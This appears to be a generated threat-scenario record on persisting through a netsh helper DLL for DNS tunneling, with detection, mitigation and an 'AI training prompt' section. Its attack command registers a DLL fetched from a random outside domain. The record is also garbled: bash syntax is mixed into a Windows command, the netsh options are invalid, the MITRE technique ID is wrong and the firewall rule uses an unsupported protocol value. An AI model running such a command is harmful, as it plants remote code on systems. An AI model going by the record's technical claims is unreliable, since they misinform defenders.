---
type: campaign
scenario_id: 428
tactic: Persistence
technique: "T1546.001: Netsh Helper DLL"
technique_id: T1546.001
tags: [campaign, lotl, persistence]
---

# Using netsh to register DNS tunneling helper DLL for persistence.

## Threat Description
Using netsh to register DNS tunneling helper DLL for persistence.

## Attack Command
```
netsh add helper http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor netsh helper: `wmic process where name='netsh.exe' get commandline | findstr helper`; Event ID 4688.

## Mitigation
Restrict netsh: `icacls %windir%\System32\netsh.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block Netsh' dir=out action=block protocol=HTTP`.

## AI Training Prompt
Train AI to detect netsh helper DLL registrations for DNS tunneling by analyzing HTTP-based DLL downloads and netsh command-line arguments; suggest firewall rules.

## References
- MITRE ATT&CK T1546.001: https://attack.mitre.org/techniques/T1546/001/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
